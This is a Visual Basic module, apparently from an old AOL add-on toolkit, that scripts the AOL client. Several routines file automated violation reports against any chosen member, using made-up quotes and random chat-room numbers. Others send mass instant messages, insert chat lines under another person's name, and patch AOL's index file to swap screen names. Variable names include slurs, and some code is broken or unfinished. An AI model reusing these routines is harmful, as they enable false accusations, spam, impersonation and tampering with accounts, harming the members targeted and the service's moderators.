    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
KillWin toswin%
KillWin reachwin%
End Sub

Sub TOS_ChatViolation_5(Who$, what$)
Ao_Keyword ("reachoutzone")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
reachwin% = FindChildByTitle(mdi%, "AOL Neighborhood Watch")
fuck% = FindChildByClass(reachwin%, "RICHCNTL")
fuck2% = GetNextWindow(fuck%, 2)
fuck3% = GetNextWindow(fuck2%, 2)
fuck4% = GetNextWindow(fuck3%, 2)
fuck5% = GetNextWindow(fuck4%, 2)
fuck6% = GetNextWindow(fuck5%, 2)
fuck7% = GetNextWindow(fuck6%, 2)
fuck8% = GetNextWindow(fuck7%, 2)
Loop Until reachwin% <> 0
timeout 3#
Ao_Click fuck8%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
timeout 3#
Ao_Click bttn%
timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
KillWin toswin%
KillWin reachwin%
End Sub

Sub TOS_ChatViolation_6(Who$, what$)
Ao_Keyword ("postmaster")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
anal% = FindChildByTitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
timeout 2#
Ao_Click bttn%
timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
KillWin toswin%
KillWin anal%
End Sub

Sub TOS_ChatViolation_7(Who$, what$)
Ao_Keyword ("guidepager")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
guidewin% = FindChildByTitle(mdi%, "Request a Guide")
poop% = FindChildByClass(guidewin%, "_AOL_Icon")
Loop Until guidewin% <> 0
Ao_Click poop%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
timeout 2#
Ao_Click bttn%
timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
KillWin toswin%
KillWin guidewin%
End Sub

Sub TOS_ChatViolation_8(Who$, what$)
Ao_Keyword ("aol://4344:1732.TOSnote.13706095.560712263")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswinz% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttns% = FindChildByClass(toswinz%, "_AOL_Icon")
bttns2% = GetNextWindow(bttns%, 2)
Loop Until toswinz% <> 0
timeout 2#
Ao_Click bttns2%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Notify AOL")
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
KillWin toswin%
KillWin anal%
End Sub

Sub AddRoomWithoutMe(lst As ListBox)
aol% = findwindow("AOL Frame25", 0&)
Debug.Print aol%
RoomList% = FindChildByTitle(aol%, "List Rooms")
Debug.Print RoomList%
Chatroom% = GetParent(RoomList%)
Debug.Print Chatroom%
List% = FindChildByClass(Chatroom%, "_AOL_Listbox")
If List% = 0 Then Exit Sub
If List% = 0 Then GoTo 19
thatlb = SendMessage(List%, LB_GETCOUNT, 0&, 0&)
For RoomNames = 0 To thatlb - 1
Buffer$ = String$(64, 0)
BuddyName% = AOLGetList(RoomNames, Buffer$)
FinalBuddyname$ = Left$(Buffer$, BuddyName%)
aol% = findwindow("AOL Frame25", 0&)
Dim mdi As Integer
mdi% = FindChildByClass(aol%, "MDIClient")
Dim welcome As Integer
welcome = FindChildByTitle(mdi%, "Welcome, ")
Dim MyName As String
MyName = String$(22, 0)
X% = getwindowtext(welcome%, MyName$, 22)
MyName$ = Left$(MyName$, X%)
MyName$ = Mid$(MyName$, InStr(MyName$, ", "), InStr(MyName$, "!") - 1)
MyName$ = Left$(MyName$, Len(MyName$) - 1)
MyName$ = Right$(MyName$, Len(MyName$) - 2)
If MyName$ = FinalBuddyname$ Then GoTo 18
For names = 0 To List1_ListCount - 1
 If FinalBuddyname$ = lst.List(names) Then GoTo 18
Next names
lst.AddItem FinalBuddyname$
18:
Next RoomNames
19:
End Sub
Sub SetAutoGreetPrefs()
a% = findwindow("AOL Frame25", 0&)
ssa% = AOLVersion()
If ssa% = "2.5" Then Wh$ = "Set Preferences" + Chr$(9) + "Ctrl+="
If ssa% = "3.0" Then Wh$ = "Preferences"
B% = RunMenu2("AOL Frame25", "Mem&bers", Wh$)
DoEvents
Do
DoEvents
c% = FindChildByTitle(a%, "Preferences")
DoEvents
Loop Until c% <> 0
DoEvents
If ssa% = 25 Then D% = GetAOLWinB(c%, "_AOL_Icon", 3)
If ssa% = 3 Then D% = GetAOLWinB(c%, "_AOL_ICON", 1)
DoEvents
AOLClick (D%)
DoEvents
Do
DoEvents
a% = findwindow("AOL Frame25", 0&)
e% = findwindow("_AOL_Modal", "Chat Preferences")
DoEvents
Loop Until e% <> 0
DoEvents
F% = FindChildByTitle(e%, "Notify me when members arrive")
DoEvents
DoEvents
h% = sendmessagebynum(F%, BM_SETCHECK, True, 0&)
DoEvents
j% = FindChildByTitle(e%, "OK")

DoEvents
AOLClick (j%)
DoEvents
k% = sendmessagebynum(c%, WM_Close, 0, 0&)
End Sub
Sub TOS_MSGBoardViolation_4(Who$, phrase$)
Do
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Ao_Click bttn3%
Do: DoEvents
toswin2% = FindChildByTitle(mdi%, "Report A Violation")
bttnz% = FindChildByClass(toswin2%, "_AOL_Icon")
blah% = GetNextWindow(bttnz%, 2)
blah2% = GetNextWindow(blah%, 2)
blah3% = GetNextWindow(blah2%, 2)
bttn4% = GetNextWindow(blah3%, 2)
Loop Until toswin2% <> 0
Ao_Click bttn4%
timeout 0.001
Do: DoEvents
toswin3% = FindChildByTitle(mdi%, "Message Board Violations")
Shiz% = FindChildByTitle(toswin3%, "COMPLETE Path where the message was posted")
shiz2% = GetNextWindow(Shiz%, 2)
shiz3% = GetNextWindow(shiz2%, 2)
shiz4% = GetNextWindow(shiz3%, 2)
shiz5% = GetNextWindow(shiz4%, 2)
donez% = GetNextWindow(shiz5%, 2)
Loop Until toswin3% <> 0
Ao_SetText shiz2%, path$
Ao_SetText shiz4%, message$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin3%
KillWin toswin2%
KillWin toswin%
End Sub

Function RunMenu2(Main_Prog As String, Top_Position As String, Menu_String As String)
Dim Top_Position_Num As Integer
Dim Buffer As String
Dim Look_For_Menu_String As Integer
Dim Trim_Buffer As String
Dim Sub_Menu_Handle As Integer
Dim BY_POSITION As Integer
Dim Get_ID As Integer
Dim Click_Menu_Item As Integer
Dim Menu_Parent As Integer
Dim aol As Integer
Dim Menu_Handle As Integer
End Function
Sub TOS_MSGBoardViolation_6(path$, message$)
Ao_Keyword ("reachoutzone")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
reachwin% = FindChildByTitle(mdi%, "AOL Neighborhood Watch")
fuck% = FindChildByClass(reachwin%, "RICHCNTL")
fuck2% = GetNextWindow(fuck%, 2)
fuck3% = GetNextWindow(fuck2%, 2)
fuck4% = GetNextWindow(fuck3%, 2)
fuck5% = GetNextWindow(fuck4%, 2)
fuck6% = GetNextWindow(fuck5%, 2)
fuck7% = GetNextWindow(fuck6%, 2)
fuck8% = GetNextWindow(fuck7%, 2)
Loop Until reachwin% <> 0
timeout 3#
Ao_Click fuck8%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
tosbttn% = GetNextWindow(bttn3%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Complete Path Where Message Was Posted:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, path$
Ao_Click whatz%
Ao_SetText whatz%, message$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin reachwin%
End Sub

Sub TOS_MSGBoardViolation_5(path$, message$)
Ao_Keyword ("postmaster")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
anal% = FindChildByTitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
tosbttn% = GetNextWindow(bttn3%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Complete Path Where Message Was Posted:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, path$
Ao_Click whatz%
Ao_SetText whatz%, message$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin anal%
End Sub

Sub TOS_MSGBoardViolation_7(path$, message$)
Ao_Keyword ("guidepager")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
guidewin% = FindChildByTitle(mdi%, "Request a Guide")
poop% = FindChildByClass(guidewin%, "_AOL_Icon")
Loop Until guidewin% <> 0
Ao_Click poop%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
tosbttn% = GetNextWindow(bttn3%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Complete Path Where Message Was Posted:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, path$
Ao_Click whatz%
Ao_SetText whatz%, message$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin guidewin%
End Sub


Function AOLAntiPunt()
'Written by Skybox
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDI Client")
im% = FindChildByTitle(mdi%, "Untitled")
Do
KillWin (im%)
Loop Until im% = 0
End Function

Function AOLAntiPunt3()
'Written by Skybox
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDI Client")
im% = FindChildByTitle(mdi%, "Untitled")
Bstrd$ = SNfromIM
Do
KillWin (im%)
Loop Until im% = 0
MsgBox "" + Bstrd$ + " Tryed to Punt you!", 16, "Idiot"
End Function

Function GetCPUType(X)
'Example: text9.text = "Your system's CPU type is: " & sGetCPUType
Dim lWinFlags As Long

    lWinFlags = GetWinFlags()

    
     If lWinFlags And WF_CPU486 Then

        X = "486"
        ElseIf lWinFlags And WF_CPU386 Then
            X = "386"
            ElseIf lWinFlags And WF_CPU286 Then
                X = "286"
                Else
                    X = "Unknown"
    End If
End Function
Function GetFreeGDI(X)
'Example: text5.text = "Free GDI Resources: " & sGetFreeGDI
    X = Format$(GetFreeSystemResources(GFSR_GDIRESOURCES)) + "%"

End Function
Function GetFreeSys(X)
'Example: text3.text = "Free System Resources: " & sGetFreeSys
    X = Format$(GetFreeSystemResources(GFSR_SYSTEMRESOURCES)) + "%"

End Function
Function GetFreeUser(X)
'Example: text4.text = "Free User Resources: " & sGetFreeUser
    X = Format$(GetFreeSystemResources(GFSR_USERRESOURCES)) + "%"

End Function
Function GetWindowDir()
Buffer$ = String$(255, 0)
X = GetWindowsDirectory(Buffer$, 255)
If Right$(Buffer$, 1) <> "\" Then Buffer$ = Buffer$ + "\"
GetWindowDir = Buffer$
End Function
Sub IMAnswer(wuttosay)
'Put in a Timer
'Call Im Answer
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If im% Then GoTo Begin
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If im% Then GoTo Begin
Exit Sub
Begin:
e = FindChildByClass(im%, "RICHCNTL")

e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e2 = getwindow(e, 2) 'Send Text
e = getwindow(e2, 2) 'Send Button
Call AOLSetText(e2, ((wuttosay) & Chr(13) & ""))
Click (e)
timeout 0.1
KillWin (im%)

End Sub
Sub ScanList(itm As String, lst As ListBox)

If itm = Sccc Then Exit Sub
If lst.ListCount = 0 Then lst.AddItem itm: Exit Sub

Do Until XX = (lst.ListCount)
Let diss_itm$ = lst.List(XX)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let XX = XX + 1
Loop
If do_it = "NO" Then Exit Sub
lst.AddItem itm
End Sub

Sub TextManipulator(Who$, wut$)
aol% = findwindow("AOL Frame25", 0&)
chatwin% = FindChildByClass(aol%, "MDIClient")
blah% = FindChildByClass(chatwin%, "AOL Child")
ChatVew% = FindChildByClass(blah%, "_AOL_View")
sndtext% = SendMessageByString(ChatVew%, WM_SETTEXT, 0, Chr(13) & Chr(9) & (Who$) & ":" & Chr(9) & (wut$))
SendNow% = sendmessagebynum(ChatVew%, WM_CHAR, &HD, 0)
End Sub
Sub MassIM(lst As ListBox, Text$)
Do
For i = 0 To lst.ListCount - 1
If m001C% = 1 Then Exit Sub
Who$ = lst.List(0)
lst.ListIndex = 0
Next i
okw = findwindow("#32770", "America Online")
okb = FindChildByTitle(okw, "OK")
okd = sendmessagebynum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = sendmessagebynum(okb, WM_LBUTTONUP, 0, 0&)
run "Send an Instant Message"
Do
aol = findwindow("AOL Frame25", 0&)
bah = FindChildByTitle(aol, "Send Instant Message")
txt% = FindChildByClass(bah, "_AOL_Edit")
DoEvents
Loop Until txt% <> 0
txt% = FindChildByClass(bah, "_AOL_Edit")
Do
RICH% = FindChildByClass(bah, "RICHCNTL")
bahqw% = FindChildByTitle(bah, "Send")
DoEvents
timeout (0.001)
Loop Until RICH% <> 0 Or bahqw% <> 0
If RICH% <> 0 Then
send txt%, Who$
send RICH%, ((Text$) & Chr(13) & "" & Chr(13) & "")
timeout (0.001)
GetNum RICH%, 1
Click RICH%
Else
send txt%, Person$
GetNum txt%, 1
send txt%, tt$
GetNum txt%, 1
Click txt%
End If
timeout (0.001)
X = sendmessagebynum(bah, WM_Close, 0, 0)
a = lst.List(0)
Call Delitem(lst, (a))
Loop Until lst.ListCount = 0
If lst.ListCount = 0 Then
Exit Sub
End If

End Sub
Sub Delitem(lst As ListBox, item$)
Do
If LCase$(lst.List(a)) = LCase$(item$) Then lst.RemoveItem (a)
a = 1 + a
Loop Until a >= lst.ListCount

End Sub

Sub send(Chatedit, sill$)
sndtext = SendMessageByString(Chatedit, WM_SETTEXT, 0, sill$)
End Sub
Sub AOLNewUserReset2(oldsn, newsn, pathh)
'Call AOLNewUserReset2("OLD SN","NEW SN","C:\aol30")
Static moocow As String * 10000
Dim Trident As Long
Dim fish As Long
Dim Tribal As Integer
Dim werd As Integer
Dim qwerty As Variant
Dim meee As Integer
On Error GoTo err0r
tru_sn = newsn + String$(Len(oldsn) - Len(newsn), " ")
Let paath$ = (pathh & "\idb\main.idx")
Open paath$ For Binary As #1 'Len = 50000
Trident& = 1
fish& = LOF(1)
While Trident& < fish&
moocow = String$(40000, Chr$(0))
Get #1, Trident&, moocow
While InStr(UCase$(moocow), UCase$(oldsn)) <> 0
Mid$(moocow, InStr(UCase$(moocow), UCase$(oldsn))) = tru_sn
Wend
    
Put #1, Trident&, moocow
Trident& = Trident& + 40000
Wend

Seek #1, Len(oldsn)
Trident& = Len(oldsn)
While Trident& < fish&
moocow = String$(255, Chr$(0))
Get #1, Trident&, moocow
While InStr(UCase$(moocow), UCase$(oldsn)) <> 0
Mid$(moocow, InStr(UCase$(moocow), UCase$(oldsn))) = tru_sn
Wend
Put #1, Trident&, moocow
Trident& = Trident& + 11900000
Wend
Close #1
Screen.MousePointer = 0
err0r:
Screen.MousePointer = 0
Exit Sub
Resume Next

End Sub
Sub VBMsg1_WindowMessage(hWindow As Integer, Msg As Integer, wParam As Integer, lParam As Long, RetVal As Long, CallDefProc As Integer)
Dim ChatText$, colon%, SN$, Textsaid$, Kword$, a%, B%, c%, edithWnd%, e%, msgnam%, send%
    ChatText$ = agGetStringFromLPSTR(lParam)
    colon% = InStr(1, ChatText$, ":")
    SN$ = Mid(ChatText$, 3, (colon% - 3))
    Textsaid$ = Right(ChatText$, (Len(ChatText$) - Len(SN$)) - 4)
    Kword$ = Text1
    If UCase$(Left$(Textsaid$, Len(Kword$))) = UCase$(Kword$) Then
        DoEvents
Call sendtext("I got it")

End If
End Sub
Sub VBMSG()
chattxt$ = agGetStringFromLPSTR$(lParam)
End Sub
Sub WaitFormModalOK()
Do
DoEvents
okw = findwindow("_AOL_Modal", 0&)
DoEvents
Loop Until okw <> 0
okw = findwindow("_AOL_Modal", 0&)
KillWin (okw)

End Sub
Function WindowsDirectory() As String
Dim WinPath As String
WinPath = String(145, Chr(0))
WindowsDirectory = Left(WinPath, GetWindowsDirectory(WinPath, Len(WinPath)))

End Function
Sub LetterExplode(lbl As Label, MAXSIZE As Integer, spd As Integer)
lbl.Visible = True
Do
For i = 1 To spd
DoEvents
Next i
lbl.FontSize = lbl.FontSize + 1
'lbl.Top = lbl.Top + 10
'lbl.Left = lbl.Left + 10
Loop Until lbl.FontSize >= MAXSIZE
'MsgBox lbl.FontSize
End Sub

Sub LetterImplode(lbl As Label, minsize As Integer, spd As Integer)
Do
For i = 1 To spd
DoEvents
Next i
lbl.FontSize = lbl.FontSize - 1
'lbl.Top = lbl.Top + 10
'lbl.Left = lbl.Left + 10
Loop Until lbl.FontSize <= minsize
lbl.Visible = False
'MsgBox lbl.FontSize
End Sub

Sub SetGoto(Title$, Marz$)
Hit_Menu "Edit Go To Menu"
Do: DoEvents
Dim AOM
Modal = findwindow("_AOL_Modal", 0&)
Loop Until Modal <> 0
DD% = FindChildByClass(Modal, "_AOL_EDIT")
send (DD%), Title$

fag% = GetNextWindow(DD%, 2)
send (fag%), (Marz$)

ab% = FindChildByTitle(Modal, "Save Changes")
Click (ab%)
End Sub
Sub Hit_Menu(Mnu_str$)
aol% = findwindow("AOL Frame25", 0&)
mnu% = Getmenu(aol%)
MNU_Count% = GetMenuItemCount(mnu%)
For Top_Level% = 0 To MNU_Count% - 1
    Sub_Mnu% = GetSubMenu(mnu%, Top_Level%)
    Sub_Count% = GetMenuItemCount(Sub_Mnu%)
    For Sub_level% = 0 To Sub_Count% - 1
        Bff$ = Space$(50)
        junk% = GetMenuString(Sub_Mnu%, Sub_level%, Bff$, 50, MF_BYPOSITION)  'As Integer
        Bff$ = Trim$(Bff$): Bff$ = Left(Bff$, Len(Bff$) - 1)
        If Bff$ = "" Then Bff$ = " -"
        If InStr(Bff$, Mnu_str$) Then
            Mnu_ID% = GetMenuItemID(Sub_Mnu%, Sub_level%)
            junk% = sendmessagebynum(aol%, WM_COMMAND, Mnu_ID%, 0)
        End If
    Next Sub_level%
Next Top_Level%
